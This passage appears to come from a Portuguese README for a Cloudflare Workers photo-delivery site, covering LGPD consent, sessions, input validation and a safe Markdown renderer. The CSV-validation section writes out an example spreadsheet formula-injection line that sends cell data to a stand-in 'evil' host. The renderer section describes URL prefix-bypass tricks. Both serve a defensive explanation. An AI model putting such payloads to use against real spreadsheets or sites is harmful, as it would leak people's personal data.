- **Edição em massa:** botão "Selecionar" mostra checkboxes nos eventos; escolha uma categoria (ou tipo de acesso) e clique "Aplicar" para atribuí-la a todos os selecionados de uma vez (`POST /api/events/bulk-category` ou `/api/events/bulk-access`) — pede confirmação **digitando a quantidade de eventos afetados** antes de aplicar.
- A lista usa renderização híbrida: a primeira página vem **SSR** (renderizada no Worker) e o JS substitui via `renderEventList()` ao mudar filtro. Os botões funcionam via event delegation (`data-action`/`data-id`), então tanto o SSR quanto o re-render funcionam com o mesmo handler.

#### Aba Métricas

Tabela com colunas: projeto, views, cliques no Drive. **Colunas ordenáveis** (clique no cabeçalho), com uma barra proporcional atrás do número de views e botão **Exportar CSV**. Dados carregados sob demanda (na primeira vez que o usuário clica na aba).

#### Aba Config

- **Categorias**: lista gerenciável de categorias (alimenta os filtros da galeria e do dashboard, e o select do formulário). Criar via `POST /api/categories` (`{name}`), excluir via `POST /api/categories/delete` (`{name}`, pede confirmação digitando o nome da categoria) — ao excluir, a categoria é removida de todos os eventos que a usavam. Guardadas na chave KV `categories`; até a primeira alteração valem os padrões (Formatura / Casamento / Ensaio / Evento / Outro).
- **Backup**: botão "Baixar backup JSON" — GET `/api/backup` retorna `fotos-backup-YYYY-MM-DD.json` (v2: eventos + categorias + solicitações). Não-destrutivo, fica fora da zona de perigo.
- **Exportar dados** (CSV): consentimentos (do D1, via `/api/consent/export`), solicitações de remoção e métricas.
- **⚠️ Zona de perigo**: card com borda vermelha, separado visualmente do resto da aba, agrupando as duas ações que mutam dados globais/credenciais e agora exigem confirmação digitada:
  - **Alterar senha**: campos "Nova senha" + "Confirmar senha", botão "Salvar" → confirma digitando `TROCAR` antes do PUT para `/api/settings/password`.
  - **Restaurar backup**: input file + botão "Restaurar backup" → confirma digitando `RESTAURAR` antes do POST para `/api/backup/restore`. Merge inteligente: mesmo `id` é atualizado só se o `updatedAt`/`createdAt` do backup for mais recente. Nada é deletado.

**Confirmações**: `confirmDialog()` (o diálogo temático do painel, não o `confirm()` nativo) ganhou um modo "digite para confirmar" (`opts.typeToConfirm`) — o botão de confirmar fica desabilitado até o texto digitado bater exatamente (case-insensitive) com o esperado. Para exclusões (evento/categoria), digita-se o nome exato do item; para ações sem um "nome" natural (restaurar backup, trocar senha, aplicar em massa), digita-se uma palavra fixa ou a quantidade de itens afetados.

#### Aba Solicitações

Lista de solicitações de remoção agrupadas por evento. Cada grupo mostra título + slug + badge com contador de pendentes. Solicitações pendentes ficam no topo; resolvidas ficam num bloco colapsável "Mostrar resolvidas". Cada item mostra: tipo (número/link/upload), valor identificador, e-mail, telefone, mensagem, data, e botão "Marcar como resolvido" se pendente. Resolver envia e-mail de confirmação ao requerente via Resend.

### Toast

`<div class="toast">` no rodapé. Funções globais `toast(msg, 'ok'|'err')` mostram por ~2s.

---

## Sistema de solicitação de remoção (LGPD)

Fluxo completo:

1. Visitante abre página do projeto, clica "Solicitar remoção de foto" no footer.
2. Modal abre. Visitante escolhe identificação (número da foto, link direto ou upload de até 2 MB), preenche e-mail + telefone (com DDD, 10–13 dígitos), motivo opcional. Submete.
3. Frontend valida tudo client-side (`/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/` para e-mail, `.replace(/\D/g,'')` para telefone) e faz POST `/api/removal-request` com `fileBase64` se upload.
4. Worker faz rate-limit (5/h por IP), valida tudo de novo server-side, monta o registro, salva no KV **sem** o `fileBase64` (binário só vai no e-mail), e:
   - **E-mail para admin** (`sendRemovalEmail`): tabela com projeto, tipo, identificação, e-mail/telefone, mensagem, data. Se upload, anexa o arquivo.
   - **E-mail para requerente** (`sendConfirmationEmail`): "Solicitação recebida — analisaremos em até 15 dias úteis", com link para WhatsApp e e-mail de suporte.
5. Admin abre aba "Solicitações", revê, clica "Marcar como resolvido".
6. `handleResolveRequest` envia `sendResolvedEmail` ao requerente ("Sua solicitação foi atendida — a foto foi removida do arquivo público").

Limites:
- Upload máximo: 2 MB raw (~2.73 MB em base64). Acima disso → HTTP 413.
- Storage de solicitações: 500 itens. Quando passa, mantém todas as pendentes e descarta resolvidas mais antigas (FIFO).
- Sem `RESEND_API_KEY`: tudo continua funcionando, só não envia e-mails (status `"skipped: RESEND_API_KEY não configurada"`).

A política de privacidade no modal explicita que e-mail/telefone são usados **apenas** para processar a solicitação, sem compartilhar com terceiros. SLA prometido: 15 dias úteis.

---

## Termos de Uso e autorização de uso de imagem (LGPD)

A página de projeto é, ao mesmo tempo, a **entrega** das fotos e a superfície de **conformidade LGPD**:

- **`/termos`** (`src/ui/terms.js`) traz os Termos de Uso com a **autorização de uso de imagem** (entrega às pessoas do evento + divulgação do trabalho em portfólio/redes, creditando @lucafchala; sem venda a terceiros), fundamentada no art. 20 do Código Civil e no consentimento da LGPD. O responsável é identificado por nome + e-mail (sem CPF/RG públicos); foro de São Paulo/SP.
- **Gate antes do Drive, verificado no servidor**: ao clicar em "Acessar fotos", o visitante passa por uma verificação Turnstile (managed, sem atrito) e marca **uma caixa** aceitando os Termos / autorizando o uso da imagem. O link real do Drive só é liberado depois que `POST /api/drive-link` valida o token do Turnstile **no servidor** (fail-closed — token inválido/ausente = 403, sem link) + o aceite — não é mais um gate cosmético: os links não existem em lugar nenhum do HTML/JS público antes disso. Opcionalmente informa o nome. Se um bloqueador de anúncios impede o Turnstile (ou o JS está desativado), um aviso pede para desativá-lo; o acesso ainda é possível por um caminho intencionalmente mais fraco (sem captcha, rate-limit próprio mais restritivo, aceite gravado com `turnstile_ok=0`) — decisão consciente para não travar a entrega a esse público, documentada em `SECURITY.md`. Uma vez que um visitante legítimo recebe o link, ele continua compartilhável (isso é inerente ao compartilhamento do Drive, não uma falha).
- **Registro do aceite** (`POST /api/drive-link` → D1, no mesmo request que libera o link): o Worker grava uma linha em `image_use_consent` com data/hora, evento, versão dos Termos + **hash SHA-256 do texto exato**, resultado do Turnstile e contexto técnico (IP, geo/ISP via `request.cf`, navegador, idioma, referrer) — comprovação para eventual disputa. Non-blocking (`ctx.waitUntil`); sem D1 provisionado, é no-op (o gate continua funcionando normalmente).
- **Transparência e retenção**: a Política de Privacidade (`/privacidade`) lista os campos registrados; o cron diário apaga registros com mais de **5 anos**. O admin exporta tudo em CSV pela aba Config.

> Os textos legais (escopo da autorização, retenção) são um rascunho razoável — recomenda-se revisão jurídica antes de produção.

---

## Autenticação e segurança

### Hash de senha (`utils.js`)

```js
hashPassword(password, saltHex?, iterations = 100_000)
// → "pbkdf2:100000:<32 hex salt>:<64 hex hash>"
```

Web Crypto puro: `importKey('PBKDF2')` + `deriveBits({ name:'PBKDF2', hash:'SHA-256', salt, iterations })` → 256 bits hex.

`verifyPassword(password, stored)`:
- Se `stored` começa com `pbkdf2:`, re-hash com mesmo salt/iter e compara em tempo constante (`timingSafeEqual`).
- Caso contrário, assume SHA-256 legado e migra automaticamente no próximo login bem-sucedido (`handleLogin` salva novo hash PBKDF2).

### Sessão

- `generateToken()` → 32 bytes random hex (64 chars).
- Salva em `admin_session:<token>` como JSON `{ v, createdAt, lastSeen, fp }`
  com TTL 86400 (24 h). Sessões antigas gravadas como a string `"valid"`
  continuam válidas até expirarem — o deploy não desloga ninguém no meio de um
  trabalho.
- Cookie: **`__Host-session`**`=<token>; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=86400`.
  O prefixo `__Host-` não é cosmético: o browser só grava um cookie com esse
  nome se ele vier `Secure`, com `Path=/` e **sem** `Domain`. Isso impede que
  qualquer outro host de `lucafchala.com` — um subdomínio comprometido, um CNAME
  órfão apontando para serviço de terceiro — plante ou sobrescreva a sessão
  deste site. É a fixação de sessão por vizinho de domínio que o
  `SameSite=Strict` sozinho não cobria.
- `verifySession(env, request)` aceita os dois nomes de cookie e encerra a sessão
  por **três** motivos: expiração absoluta (24 h, TTL do KV), **inatividade**
  (2 h) e **divergência do cliente** (hash do User-Agent). O IP fica fora do
  vínculo de propósito — celular troca de IP entre 4G e Wi-Fi o tempo todo, e
  amarrar a sessão a ele deslogaria o admin no meio de uma edição.
- O `lastSeen` é reescrito no máximo a cada 10 min. Sem essa trava, o painel
  (que faz várias chamadas por tela) consumiria a cota de escrita do KV — 1000/dia,
  compartilhada com eventos, sessões e consentimento.
- Logout deleta a chave do KV, expira **os dois** nomes de cookie e envia
  `Clear-Site-Data: "cache", "cookies", "storage"` — sem isso, "sair" num
  computador emprestado deixa a última tela do painel recuperável pelo botão
  voltar.
- Trocar a senha revoga todas as **outras** sessões, mantendo a de quem trocou.

### Comparação em tempo constante

`timingSafeEqual(a, b)` faz XOR byte a byte sem early-return. Usado para comparar hashes.

### Headers de segurança em toda resposta HTML

Já listados em [Rotas HTTP](#rotas-http) — `nosniff`, `frame DENY`, `Referrer-Policy strict-origin-when-cross-origin`, e `upgrade-insecure-requests`.

### Validação de entrada

- Slugs: `^[a-z0-9][a-z0-9-]*[a-z0-9]$|^[a-z0-9]$`, ≤ 60 chars.
- E-mails: regex `^[^\s@]+@[^\s@]+\.[^\s@]{2,}$`.
- Telefones: 10–13 dígitos depois de remover não-numéricos.
- Datas: `^\d{4}-\d{2}-\d{2}$` (ou descarta).
- Status: whitelist `['em-edicao','em-revisao','entregue','arquivado']`.
- Method de remoção: whitelist `['number','url','upload']`.
- Strings: todas truncadas com `.slice(0, N)` antes de salvar.
- URLs: `toHttps()` reescreve `http://` para `https://`.
- HTML: `escape()` em `utils.js` faz `& < > " '` → entidades, aplicado em **todo** valor de usuário antes de interpolar em template.
- CSV: `csvCell()` neutraliza `=` `+` `-` `@` TAB e CR iniciais. Não é
  paranoia — o export de consentimentos carrega `consenter_name`, `user_agent` e
  `referrer`, todos controlados pelo visitante, e Excel/Sheets executam uma
  célula que começa com esses caracteres. `=HYPERLINK("https://evil/?x="&A1,…)`
  atravessaria a citação do CSV (aspas são citação, não escape de fórmula) e
  rodaria na planilha do admin, com a base de dados pessoais aberta na frente.
- Nome de arquivo: `sanitizeFilename()` tira travessia de caminho, CR/LF (que
  forjaria o cabeçalho MIME do anexo) e dupla extensão (`foto.jpg.exe`).
- Imagem enviada: além do sniff de magic bytes, `stripImageMetadata()` remove
  EXIF/GPS/XMP de JPEG, PNG, WebP e GIF **antes** de a foto virar anexo de
  e-mail; em HEIC/AVIF, onde apagar os bytes moveria a imagem e invalidaria os
  deslocamentos da tabela `iloc`, os metadados são **zerados no lugar**. Quem
  manda uma foto pedindo remoção não está oferecendo as coordenadas de onde ela
  foi tirada. O portão é a própria limpeza: o que não sai comprovadamente limpo
  é recusado com orientação, não anexado.
- Restore de backup: `sanitizeRestoredRequest()` e `mergeRestore()` filtram por
  chave, tipo e tamanho. Era o único caminho que gravava em KV sem passar pelo
  normalizador de eventos.

### `ctx.waitUntil`

Usado em `handleEventPage` para incrementar `views:<slug>` sem bloquear a resposta. Se a escrita falhar, o usuário não percebe.

---

## Conformidade legal (LGPD)

A face pública disso é a **Central de Transparência** em
[`/legal`](https://fotos.lucafchala.com/legal) (também em `/compliance`): reúne
privacidade, termos, política de segurança, o resumo do que é feito com cada
dado, os canais de contato e a documentação abaixo. É o que permitiu o rodapé
ter **um** link jurídico em vez de dois, sem esconder nada.

O pacote completo está em [`docs/legal/`](./docs/legal/). Ele foi escrito
**lendo o código**, não presumindo o que o código deveria fazer — cada medida
citada aponta para a função que a implementa.

| Documento | O que é |
| --- | --- |
| [`ROPA.md`](./docs/legal/ROPA.md) | Registro das operações (art. 37): cada dado, origem, base legal, retenção, destino |
| [`RIPD.md`](./docs/legal/RIPD.md) | Relatório de impacto (art. 38): 8 riscos com probabilidade, impacto, mitigação e risco residual |
| [`LIA.md`](./docs/legal/LIA.md) | Teste de legítimo interesse (art. 10) em três etapas |
| [`transferencia-internacional.md`](./docs/legal/transferencia-internacional.md) | Art. 33 — **todos** os operadores ficam nos EUA |
| [`politica-de-retencao.md`](./docs/legal/politica-de-retencao.md) | Prazos, o cron que executa, e como verificar que executou |
| [`direitos-do-titular.md`](./docs/legal/direitos-do-titular.md) | Art. 18: canais, prazos, confirmação de identidade, modelos |
| [`plano-resposta-incidentes.md`](./docs/legal/plano-resposta-incidentes.md) | Art. 48: primeiras horas, critério de comunicação, comandos de contenção |
| [`politica-seguranca-informacao.md`](./docs/legal/politica-seguranca-informacao.md) | Art. 46: cada medida com o ponteiro para o código |
| [`termo-autorizacao-uso-imagem.md`](./docs/legal/termo-autorizacao-uso-imagem.md) | Modelos para assinatura: adulto, responsável por menor, instituição |
| [`checklist-conformidade.md`](./docs/legal/checklist-conformidade.md) | Estado item a item e o que fazer, em ordem |

### O ponto que o código não resolve

O RIPD conclui que o maior risco residual do sistema **não é técnico**: é a
ausência de **autorização de uso de imagem assinada pelo responsável legal**
para crianças e adolescentes (art. 14 da LGPD). Eventos escolares e formaturas
envolvem menores, e o aceite de uma caixa no site é prova frágil de
consentimento parental — quem marcou pode não ser o responsável.

Nenhuma medida no Worker alcança isso, porque a coleta acontece no evento ou no
contrato com a escola. Os modelos prontos estão em
[`termo-autorizacao-uso-imagem.md`](./docs/legal/termo-autorizacao-uso-imagem.md);
o caminho de menor atrito é o Modelo 3, anexado ao contrato com a instituição.

> Todos esses documentos foram redigidos com auxílio de IA e **não constituem
> parecer jurídico**. Os pontos marcados ⚖️ dependem de revisão de advogado(a)
> com prática em LGPD e direito de imagem.

---

## Páginas dos documentos legais

Todo documento de conformidade tem **página própria no site**, em
`/legal/<slug>`. Nenhum deles manda o visitante para fora.

### Por que não linkar o repositório

Era assim antes, e estava errado por três motivos que só aparecem quando você
tenta ler de verdade:

1. **Mandar alguém para outro serviço para ler a política que rege os dados
   dele é o oposto de transparência.** A pessoa cai numa interface que não é a
   nossa, com barra de navegação de outro produto, e precisa entender o que é
   um repositório para se orientar.
2. **Markdown no GitHub em celular é ruim** — tabela estoura, o tema não
   acompanha o do site, e o rodapé com os canais de contato some.
3. **Um link externo é um ponto de falha fora do nosso controle.** Se o repo
   for renomeado, movido ou fechado, a página de conformidade fica com links
   mortos — justamente a página cuja promessa é estar correta.

A regra hoje é explícita e verificada pela CI: **só o link "Código-fonte" do
rodapé aponta para o GitHub.**

### Como o texto chega até a página

O markdown continua sendo a fonte da verdade. Um Worker não tem sistema de
arquivos, então o conteúdo precisa estar no bundle — e a alternativa (manter o
texto duplicado à mão num arquivo `.js`) divergiria na primeira edição.

```
docs/legal/*.md ─┐
                 ├─► scripts/build-legal-docs.mjs ─► src/content/legal-docs.js ─► docHTML()
SECURITY.md ─────┘        (npm run build:legal)          (gerado, commitado)
```

- `src/content/legal-docs.js` é **gerado**. Não edite à mão.
- Depois de mexer em qualquer `.md`, rode `npm run build:legal` e commite.
- A CI regenera e compara (`git diff --exit-code`). Editar um documento sem
  regenerar **derruba o build** — sem isso, a página publicada mostraria um
  texto diferente do documento oficial, que é a pior divergência possível
  justamente aqui.

O script também é onde vivem o **slug**, o **título**, o **resumo** e a
**etiqueta** de cada documento. A mesma lista alimenta a Central de
Transparência, as rotas e o sitemap — uma cópia a mais divergiria no primeiro
documento novo.

### Slugs

| Rota | Origem |
| --- | --- |
| `/legal/politica-de-seguranca` | `SECURITY.md` |
| `/legal/registro-de-operacoes` | `docs/legal/ROPA.md` |
| `/legal/relatorio-de-impacto` | `docs/legal/RIPD.md` |
| `/legal/legitimo-interesse` | `docs/legal/LIA.md` |
| `/legal/politica-de-retencao` | `docs/legal/politica-de-retencao.md` |
| `/legal/transferencia-internacional` | `docs/legal/transferencia-internacional.md` |
| `/legal/direitos-do-titular` | `docs/legal/direitos-do-titular.md` |
| `/legal/resposta-a-incidentes` | `docs/legal/plano-resposta-incidentes.md` |
| `/legal/seguranca-da-informacao` | `docs/legal/politica-seguranca-informacao.md` |
| `/legal/autorizacao-de-imagem` | `docs/legal/termo-autorizacao-uso-imagem.md` |
| `/legal/checklist` | `docs/legal/checklist-conformidade.md` |
| `/legal/sobre-esta-documentacao` | `docs/legal/README.md` |

Os slugs são **contrato público**: aparecem no sitemap e podem ter sido salvos
por alguém. Renomear um quebra links de fora — se precisar, mantenha o antigo
redirecionando.

### O renderizador (`src/ui/markdown.js`)

Subconjunto próprio de Markdown, não uma biblioteca. Uma dependência completa
traria um parser grande, superfície de XSS conhecida e atualizações a
acompanhar — tudo para renderizar doze arquivos que nós mesmos escrevemos.

**A regra que sustenta a segurança dele: escapar PRIMEIRO, formatar DEPOIS.**
Todo texto passa por `escape()` antes de qualquer regex de formatação rodar.
Assim um `<script>` no markdown já é `&lt;script&gt;` quando as regras inline
agem, e nenhuma delas consegue reconstituir uma tag. A ordem inversa —
formatar e depois tentar limpar — é exatamente como sanitizadores de markdown
costumam falhar.

Suporta: títulos (com âncora e índice automático), parágrafos, listas
ordenadas e não ordenadas, tabelas, blocos de código cercados, citações
(recursivas — os avisos e os modelos de termo são citações com títulos e
tabelas dentro), `**negrito**`, `*itálico*`, `` `código` `` e links.

#### O que ele faz com cada link

| Destino no markdown | Vira |
| --- | --- |
| `./ROPA.md`, `../../SECURITY.md` | `/legal/<slug>` correspondente |
| `https://fotos.lucafchala.com/x` | `/x` (relativo, não sai e volta) |
| `https://` externo | mantido, com `target="_blank" rel="noopener noreferrer"` |
| `mailto:` | mantido |
| `#ancora` | mantido |
| **`github.com` (qualquer)** | **rebaixado a texto puro** |
| `./TODO.md`, `../../LEGAL.md`, `.js`… | rebaixado a texto puro |
| `javascript:`, `data:`, `http:` | rebaixado a texto puro |

"Rebaixado a texto puro" significa que o rótulo continua legível e só o link
some. Isso cumpre a regra do GitHub **sem depender de alguém revisar cada
markdown antes de publicar**, e evita link morto numa página institucional.

#### Duas decisões que parecem contraditórias e não são

**O host do próprio site é comparado com `new URL()`, e não com
`startsWith()`.** A primeira versão fazia
`href.startsWith('https://fotos.lucafchala.com')` e fatiava o resto. Isso
aceita `https://fotos.lucafchala.com.exemplo.com/x` (subdomínio de outra
pessoa) e `https://fotos.lucafchala.com@exemplo.com/x` (o nosso nome como
*userinfo* antes do `@`): dois hosts de terceiros que só *começam* com o nosso
nome. O corte devolvia algo como `.exemplo.com/x`, que o navegador lê como
caminho relativo. Comparar URL por prefixo de string é o mesmo erro que, em
outro ponto de qualquer código, vira redirecionamento aberto — o parser não o
comete. Achado pelo CodeQL, não pela revisão manual.

**Mas a regra do GitHub continua sendo uma substring**, de propósito. As duas
checagens têm sinais opostos: reconhecer "é o nosso site" é uma **permissão**,
onde alcance a mais deixa passar host alheio; barrar GitHub é uma **negação**,
onde alcance a mais no máximo rebaixa a texto um link que talvez pudesse ficar.
Errar para o lado seguro é lados diferentes em cada caso.

**O destino é desescapado em uma passada só.** Ele chega já escapado (a regra
"escapar primeiro") e precisa voltar ao original para ser analisado. Feito em
`replace` encadeados — `&amp;` → `&`, depois `&quot;` → `"` — o texto
`&amp;quot;` perde duas camadas em vez de uma e vira aspas de verdade: o
caractere que fecha o atributo `href`. O `escape()` da emissão ainda seguraria
a fuga, mas segurança que depende só do último passo quebra no dia em que
alguém mexe no último passo. Uma passada única (`/&(?:amp|quot|#x27|lt|gt);/g`)
nunca reexamina o que acabou de produzir, e o problema deixa de existir em vez
de ficar contido.

### Detalhes da página (`src/ui/doc.js`)

- **Índice lateral** gerado dos `##`/`###`, mostrado a partir de 3 seções.
- **Navegação anterior/próximo** na ordem da Central — ler conformidade é
  navegação sequencial mais vezes do que se imagina.
- Tabelas rolam dentro do próprio contêiner (`overflow-x`), então documento com
  tabela larga não empurra a página no celular.
- `.doc a code{color:inherit}`: vários links têm o nome do arquivo como rótulo,
  e o rótulo é código inline. Sem essa regra a cor de `<code>` vence a do link
  e ele fica com cara de texto morto.

---

## E-mails transacionais (Resend)

Quatro templates inline em `utils.js`, todos com `<div style="...">` (CSS inline porque clientes de e-mail são casos especiais):

| Função | Quando | Destinatário | Assunto |
| --- | --- | --- | --- |
| `sendRemovalEmail` | Nova solicitação de remoção | `env.ADMIN_EMAIL` | `🗑 Remoção solicitada — <título>` |
| `sendConfirmationEmail` | Mesma solicitação, confirmação automática | `req.email` (do requerente) | `Solicitação recebida — <título>` |
| `sendResolvedEmail` | Admin marca como resolvido | `req.email` (do requerente) | `Solicitação atendida — <título>` |
| `sendSupportEmail` | Formulário de `/suporte` enviado | `env.ADMIN_EMAIL` (com `reply_to` do remetente) | `📬 Suporte[ — <nome>]` |

Todos enviam via `POST https://api.resend.com/emails` com `Authorization: Bearer <RESEND_API_KEY>`. Erros são re-lançados como `throw new Error('Resend <status>: <body>')` para o handler capturar e registrar em `emailStatus`. Sem API key, retornam `false` silenciosamente.

`from`: `Fotos <noreply@lucafchala.com>` (domínio precisa estar verificado no Resend).

---

## Métricas

Dois contadores em KV, ambos por evento:

- `views:<slug>`: incrementado em cada `GET /<slug>` via `ctx.waitUntil`. Race conditions são possíveis em alta concorrência (read-modify-write não atômico), mas o erro de contagem é aceitável para o caso de uso.
- `drive_clicks:<slug>`: incrementado em `POST /api/track-drive`, chamado pelo botão "Ir para o Drive" antes de abrir a modal externa. Rate-limit: 60/h por IP (60 cliques por hora por IP é mais que suficiente).

Os dois passam por `bumpCounter()` (`src/utils.js`), que **não grava um `put` por requisição**. O primeiro incremento de cada isolate grava na hora; os que chegam nos 10 s seguintes se somam na memória e viram um lote só. É o que impede o custo em KV de crescer junto com o público — e a gravação imediata do primeiro é o que impede tráfego esparso de perder a contagem inteira, já que um isolate ocioso morre antes de qualquer segundo incremento (e o cron não alcança: roda em outro isolate, com o mapa vazio).

O rate-limit do `/api/track-drive` continua existindo **apesar** da agregação, e roda depois das validações de graça (corpo, formato do slug, evento existir e não estar "em breve"), para que POST de lixo custe zero escrita. A agregação limita o custo por *requisição*; sem o limite por IP, um flood sustentado ainda custaria uma escrita por janela — ~8600/dia contra a cota de 1000/dia do plano gratuito.

Endpoint `/api/metrics` (auth) retorna array `[{slug, title, views, driveClicks}]` ordenado por views desc. Lê todos os contadores em paralelo via `Promise.all`.

Em paralelo, **Cloudflare Web Analytics** é opcional (controlado por `CF_ANALYTICS_TOKEN`). Quando definido, o beacon é injetado nas páginas públicas e o painel da Cloudflare mostra agregados (pageviews, dispositivos, países, referrers) sem cookies e sem tracking individual.

---

## Backup e restauração

### Download

`GET /api/backup` (auth) retorna:

```json
{
  "version": 2,
  "backupAt": "ISO date",
  "eventCount": N,
  "events": [ ... ],
  "categories": [ ... ],
  "removalRequests": [ ... ]
}
```

Headers:
```
Content-Type: application/json
Content-Disposition: attachment; filename="fotos-backup-YYYY-MM-DD.json"
```

### Restore

`POST /api/backup/restore` (auth) com o JSON do backup no body (aceita **v1** só-eventos e **v2** completo). Eventos via `mergeRestore`:

- Para cada evento do backup:
  - Se não existe no KV → adicionar (`added++`).
  - Se existe → comparar `updatedAt || createdAt`. O mais recente vence (`updated++`).
- Eventos atuais que **não** estão no backup são preservados (nunca deleta).

Seções v2 (opcionais, mescladas sem apagar nada): `categories` (união) e `removalRequests` (por id). Backups v2 antigos podem conter uma seção `reviews` — ela é ignorada (o recurso de avaliações foi removido).

Resposta: `{ok:true, added, updated, total, categories?, removalRequestsAdded?}`.

---

## PWA, ícones e analytics

### PWA

- `/manifest.json` (em `handleManifest`): name "fotos · Luca F. Chala", `start_url: /dashboard`, `display: standalone`, theme/background `#0a0a0a`, ícone `/icon.svg` `purpose: any maskable`.
- Login e dashboard incluem `<link rel="manifest" href="/manifest.json">`, então instalar a partir do `/dashboard` no celular dá um "app" do painel. Páginas públicas não referenciam o manifest (não precisam instalação).

### Ícone

`/icon.svg` é um SVG inline de 256×256: fundo `#0a0a0a` com borda arredondada (rx=48) e texto "f." centralizado em Inter 600 cor `#f0ebe5`. Cache 7 dias.

### Cloudflare Web Analytics

Quando `env.CF_ANALYTICS_TOKEN` está setado, gallery e event injetam:

```html
<script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"token":"<token>"}'></script>
```

O JSON do token é escapado com `.replace(/</g, '\\u003c')` para evitar quebrar a tag.

---

## Health check e CI

`GET /api/healthz`:

1. **Sem rate-limit** (de propósito): o `checkRateLimit` faria um *write* no KV por chamada, e o monitor de status bate aqui de forma agendada — o write por chamada não compensava o teto de 10/min (o trabalho do healthz é limitado e fica atrás da borda/DDoS da Cloudflare). Resultado: o healthz **só lê** o KV, nunca grava.
2. **Leitura 1/2 (KV):** `getEvents(env, true)` — uma única leitura de `events` confirma que o binding KV responde **e** que a chave principal ainda é um array válido. Reporta a contagem em `events` e o tempo em `kvLatencyMs`. (Substituiu a antiga sonda descartável `__healthz__`: a mesma leitura agora faz trabalho útil.)
3. Se o binding `CONSENT_DB` existir, um `SELECT 1` checa o D1 (log de consentimento) e cronometra em `d1LatencyMs` — não é KV. É **best-effort**: `d1` vira `"down"` mas isso *não* derruba o `ok` (um D1 ausente/sem escopo nunca pode reprovar o deploy — ver `deploy.yml`).
4. `await hashPassword('healthcheck')` — canário do budget de CPU do Worker (não é KV). **Não cronometrado**: o Workers congela `Date.now()` durante execução síncrona, então o antigo `hashMs` era zero por construção (RETOMADA §5.9). O que prova o orçamento é o hash *completar*: se não couber, a requisição morre e o endpoint devolve 5xx.
5. **Leitura 2/2 (KV):** `cron` `{ lastRunAt, ageHours, stale }` — heartbeat gravado pelo `scheduled` em `cron:last`, que detecta um cron *silenciosamente morto*.
6. **Autoteste funcional (`selftest`) — ZERO leituras extras de KV** (roda sobre o array de `events` já carregado no passo 2, via `auditSite`): sinaliza coisas que "deram errado" e que um 500 não pegaria — `{ ok, problems[], drive: { ok, bad, live }, forms: { turnstile, resend, adminEmail }, sample }`. Detecta **links do Google Drive ausentes/inválidos** em eventos publicados (acesso ao Drive quebrado), **dados inconsistentes** (slug duplicado → rotas colidem, status fora do enum, evento sem título), e **dependências de formulário ausentes** (Turnstile/Resend/`ADMIN_EMAIL` — sem elas os formulários de suporte/remoção/Drive recusam ou não entregam envios). `sample` aponta um evento publicado saudável para o dashboard fazer deep-probe (gate do Drive + form de remoção). `auditSite` é puro e tem teste unitário.
7. **Resto do diagnóstico — ZERO leituras extras de KV:** `config` `{ resend, turnstile, consentDb, adminEmail }` (booleanos a partir dos bindings — segredos de produção presentes, sem vazar valores), `termsVersion`, `colo`/`country` (de `request.cf`) e `now`.
8. Retorna `{ ok, kv, events, d1, … }`. `ok` é `true` (HTTP 200) só quando a lista veio **do próprio KV** e `events` é um array; caso contrário `ok:false` com HTTP 503.

   > **Por que "do próprio KV" e não só "a leitura funcionou":** com o KV fora, `getEvents()` serve de uma cópia de sobrevivência (cache do isolate, depois Cache API — ver [SECURITY.md](./SECURITY.md#the-event-list-survives-kv-being-unavailable)), então o site continua entregando as fotos. Isso é ótimo para o visitante e péssimo para o painel: sem distinguir as duas origens, o healthz diria `kv:true` no meio de uma queda e nada ficaria vermelho. Um contador de quedas comparado antes e depois da leitura resolve — ele diz se **esta** leitura veio do KV ou da cópia. Site de pé **não** pode deixar o painel verde. (O `selftest.ok` é independente do `ok` de topo — um link de Drive quebrado não derruba o healthz nem reprova o deploy; só acende o alerta no dashboard.)

**Frugal em KV:** o endpoint continua fazendo **2 leituras de KV** por chamada (`events` + `cron:last`), exatamente como antes desta expansão — a sonda `__healthz__` redundante foi trocada pelo heartbeat do cron. Contagens de backlog/categorias foram deliberadamente deixadas de fora daqui (custariam uma leitura cada e não sinalizam *falha*); um admin não configurado já é pego pela sonda `/dashboard` (503) do dashboard de status.

`ok` continua presente e com o mesmo significado — o smoke test do CI segue funcionando. (`hashMs` foi removido: era zero por construção, ver RETOMADA §5.9.) Todos os campos extras são consumidos pelo dashboard de status (`status.lucafchala.com`), que faz fetch server-side deste endpoint e disseca **cada** campo para sinalizar qualquer anomalia (cron parado, KV lento, segredo de hardening ausente) sem depender de CORS. O heartbeat do cron é puro o suficiente para ter teste unitário (`cronStale`, em `tests/index.test.js`) — e `handleHealthz()` em si (KV/D1 caindo, `cron.stale`, `config`, `selftest`) e o `scheduled()` que grava esse heartbeat têm cobertura própria em `tests/healthz.test.js`, incluindo o isolamento entre as duas tarefas de limpeza do cron (uma falhar não impede a outra nem o heartbeat).

O cron diário (`scheduled()`) agora também dispara `sendErrorAlert()` quando `pruneResolvedRemovalRequests` ou `pruneOldConsent` falha — antes só ia pro `console.error`, o que deixava uma falha de retenção visível só nos logs da Cloudflare. Isso ainda não cobre uma queda **total** do Worker (nada capturável é lançado); fechar isso exige um monitor externo, fora do Worker — item em aberto no [TODO.md](./TODO.md), ainda sem serviço decidido.

### Observabilidade (logs e traces da Cloudflare)

Configurada no bloco `[observability]` do **`wrangler.toml`** — e ela **precisa**
estar lá, não só no painel da Cloudflare.

O motivo está no próprio código do `wrangler`, no passo que grava as
configurações não-versionadas do script:

```js
// If the user hasn't specified observability assume that they want it
// disabled if they have it on. [...] will remove observability if it has
// been removed from their Wrangler configuration file
observability: worker.observability ?? { enabled: false },
```

Ou seja: **o `wrangler deploy` trata a configuração como fonte da verdade e
desliga o que não estiver declarado ali.** Como o deploy roda a cada push na
`main`, ligar observabilidade só pelo painel dura até o próximo merge — o log
para de ser gravado sem ninguém ter mexido em nada, e a descoberta vem no meio
de um incidente, exatamente quando não dá para reconstruir o histórico.

Sobre o `enabled = false` no topo com `logs` e `traces` ligados: não é
contradição. O aninhado tem precedência sobre o de cima —

```js
logs_enabled: observability?.logs?.enabled ?? observability?.enabled === true
```

— então `logs.enabled = true` vale mesmo com o topo em `false`.

| Chave | Valor | O que faz |
| --- | --- | --- |
| `logs.persist` | `true` | Grava os logs na plataforma da Cloudflare, consultáveis no painel |
| `logs.invocation_logs` | `true` | Uma linha por invocação, além do que o código escreve |
| `logs.head_sampling_rate` | `1` | 100% — o volume deste site não justifica amostrar |
| `traces.persist` | `true` | Idem para traces |

